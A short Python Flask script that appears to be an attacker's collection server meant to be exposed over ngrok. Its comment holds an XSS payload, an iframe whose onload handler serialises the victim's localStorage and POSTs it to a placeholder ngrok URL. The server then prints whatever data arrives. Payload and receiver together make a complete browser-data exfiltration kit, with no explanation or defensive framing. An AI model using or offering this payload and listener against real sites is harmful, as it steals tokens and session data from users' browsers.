# serve over ngrok 
# Payload <iframe onload="javascript:var x = JSON.stringify(localStorage); var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://ngrokflaskurl/', true); xhr.send(x);">
from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        print(request.get_data())
    return 'Request received!'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)
